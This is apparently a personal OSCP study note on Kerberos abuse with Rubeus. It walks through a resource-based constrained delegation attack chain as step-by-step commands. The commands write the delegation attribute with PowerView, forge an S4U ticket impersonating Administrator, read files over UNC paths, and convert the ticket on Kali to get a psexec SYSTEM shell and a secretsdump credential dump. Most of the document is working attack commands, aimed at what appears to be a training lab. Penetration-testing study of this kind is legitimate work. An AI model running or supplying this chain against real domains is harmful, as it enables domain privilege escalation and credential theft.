# Rubeus — Kerberos Abuse (S4U / RBCD / tickets)

**What it is:** a Windows `.exe` for raw Kerberos ticket operations — request TGTs/TGSs,
hash passwords, and run **S4U** (constrained-delegation) attacks. The OSCP use-case is
**Resource-Based Constrained Delegation (RBCD)**: you have *write* control over a computer
object → forge a service ticket as **any user** (e.g. Administrator) → access that machine.

> Runs **on the target** (it's a Windows binary). The ticket it produces can be used there
> **or** exported back to Kali. Both paths are below.

---

## The RBCD chain (where Rubeus fits)

1. **Setup (PowerView/Powermad on target):** create a fake computer, write its SID into the
   victim's `msDS-AllowedToActOnBehalfOfOtherIdentity`. *(see [[Active_Directory_Attacks]])*
2. **Rubeus:** hash the fake computer's password → run S4U → get a ticket for a chosen SPN
   as the impersonated user.
3. **Use the ticket:** UNC access on the target, or convert + use from Kali.

### Setup prerequisites that bite (do these or step 2 fails silently)

```powershell
# After building $SDBytes you MUST serialise it — an un-serialised byte[] is all zeros
# and the write throws "A constraint violation occurred."
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)          # <-- the step that's easy to skip

# $TargetComputer MUST be set, with a trailing $, or Set-DomainObject writes to EVERY computer
$TargetComputer = 'RESOURCEDC$'
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify it landed before moving on:
Get-DomainComputer $TargetComputer -Properties msds-allowedtoactonbehalfofotheridentity
```

> `$ComputerSid` from `Get-DomainComputer ... | Select -Expand objectsid` is sometimes a
> raw byte[] (prints blank). Just read the SID off the full `Get-DomainComputer <name>`
> output and assign it as a **quoted string**: `$ComputerSid = "S-1-5-21-...-4101"`.

---

## Rubeus commands (run ON the target / WinRM)

```powershell
# 1. Turn the fake computer's plaintext password into its RC4 (NTLM) hash
.\Rubeus.exe hash /password:Summer2018!

# 2. S4U — get a service ticket as the impersonated user for a chosen SPN
.\Rubeus.exe s4u /user:attackersystem$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/ResourceDC.resourced.local /ptt
```

**Key flags:**
| Flag | Meaning |
|---|---|
| `/user:` | the computer account you control (**trailing `$`**) |
| `/rc4:` | RC4 hash of that account's password (from `Rubeus.exe hash`) |
| `/impersonateuser:` | who to forge the ticket as — use **`Administrator`** (not `admin`) |
| `/msdsspn:` | the service to pretend to be — `cifs/<FQDN>` = SMB/file access |
| `/ptt` | "pass-the-ticket" — inject into the **current** session's memory |

> **SPN = capability.** `cifs/...` gives **SMB only**. It is **not** a TGT and does **not**
> make you admin everywhere. `host/`, `http/`, `ldap/` etc. are different capabilities —
> you can only use SPNs the delegation allows.

---

## Using a `/ptt` ticket IN the WinRM session — the UNC rule

`/ptt` prints `Ticket successfully imported!` — but the ticket is a **CIFS/network**
credential. It authenticates you over **SMB**, not to the local token.

```powershell
# ❌ These use your LOCAL token (still l.livingstone) -> "Access is denied":
cd C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\proof.txt

# ✅ Go through the UNC path to the SAME host the SPN names -> Kerberos CIFS kicks in:
ls   \\ResourceDC.resourced.local\C$\Users\Administrator\Desktop\
type \\ResourceDC.resourced.local\C$\Users\Administrator\Desktop\proof.txt
```

> Use the **FQDN from the SPN** (`ResourceDC.resourced.local`), never the IP — Kerberos
> matches the ticket by name.

**Dead ends in evil-winrm (don't waste time):**
- `runas Administrator ...` — needs a password + interactive desktop; won't elevate here.
- `dir /s /b C:\ | findstr ...` — that's **cmd** syntax; evil-winrm is PowerShell. Use
  `Get-ChildItem -Recurse C:\ -Filter proof.txt -ErrorAction SilentlyContinue`.

---

## Using the ticket FROM Kali (local)

Rubeus prints `base64(ticket.kirbi)` for the SPN. Take the **last** block (the S4U2proxy
one for your `cifs/` SPN) — the first two are intermediate.

```bash
# 1. Paste the base64 into ticket.b64, then strip whitespace + decode to .kirbi
tr -d ' \n' < ticket.b64 | base64 -d > ticket.kirbi

# 2. Windows .kirbi -> Linux .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# 3. Point Kerberos at it, then use impacket with -k -no-pass
export KRB5CCNAME=$PWD/ticket.ccache
impacket-smbclient -k -no-pass ResourceDC.resourced.local       # browse C$ maybe only looking for root flag
impacket-psexec    -k -no-pass ResourceDC.resourced.local       # SYSTEM shell (rides CIFS) for sure Administrator 
impacket-secretsdump -k -no-pass ResourceDC.resourced.local     # dump hashes
```

> Why bother when `/ptt` already works? Kali-side gives you **psexec → SYSTEM shell** and
> **secretsdump**, which you can't do cleanly from inside the WinRM box. CIFS SPN is enough
> for all three because they tunnel over SMB.
>
> **Requirements:** target by **FQDN** (SPN match), `/etc/hosts` entry for it, and a clock
> within ~5 min of the DC (`sudo ntpdate <DC>` or `sudo rdate -n <DC>` if skewed).

---

## Quick reference — what each ticket SPN buys you

| `/msdsspn:` | Reach it with | Gets you |
|---|---|---|
| `cifs/<FQDN>` | SMB, UNC path, psexec, secretsdump | file access + SYSTEM shell |
| `host/<FQDN>` | scheduled tasks / service control | code exec (broader) |
| `http/<FQDN>` | WinRM / WSMan | PS remoting as the user |
| `ldap/<FQDN>` | dcsync | credential dumping |

Related: [[Active_Directory_Attacks]] · [[Impacket]] · [[Mimikatz]] · [[RDP_and_WinRM]]
